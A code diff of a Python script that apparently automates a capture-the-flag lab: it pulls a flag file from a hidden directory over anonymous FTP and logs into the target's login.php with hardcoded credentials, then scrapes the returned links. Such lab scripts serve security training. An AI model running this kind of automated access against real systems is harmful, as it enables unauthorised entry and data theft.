@@ -7,26 +7,34 @@ import requests as req
 import sys
 import pprint
 import socket
+import os
 from bs4 import BeautifulSoup
-from os import dup2
 from subprocess import run
+from ftplib import FTP
 
 tar_ip = sys.argv[1] #target IP
 sess = req.Session()
 
-def Mino_ftp_engine()
+def Mino_ftp_engine():
 
-#Import ftplib for this function or atleast try to.
-    
+    with FTP(tar_ip) as conn:
+         fn = 'flag.txt'
+         conn.login(user='anonymous', passwd='anonymous')
+         conn.cwd('/pub/.secret')
+
+         conn.retrbinary("RETR " + fn, open(fn, 'wb').write)
+         print('check the home directory for the flag') #Automate this part
+         conn.quit()
+
 Mino_ftp_engine()
 
-def Mino_web_engine_login(): #Not going to cover the sql bit as i dont think its necessary and its time consuming to get a response back. I might add a seperate script to the repo that will take care of it
+def Mino_web_engine_login():
     url_L = f'http://{tar_ip}/login.php'
     PostData_L = {'email': 'M!n0taur', 'password': 'aminotauro'}
     res = sess.post(url_L, data=PostData_L)
     soup = BeautifulSoup(res.content, "html.parser")
 
-    fetch_href_flag = soup.find_all("a") #Out of my limited knowledge of this library, this is the best i can do for now.
+    fetch_href_flag = soup.find_all("a")
     print(fetch_href_flag)
 
 Mino_web_engine_login()
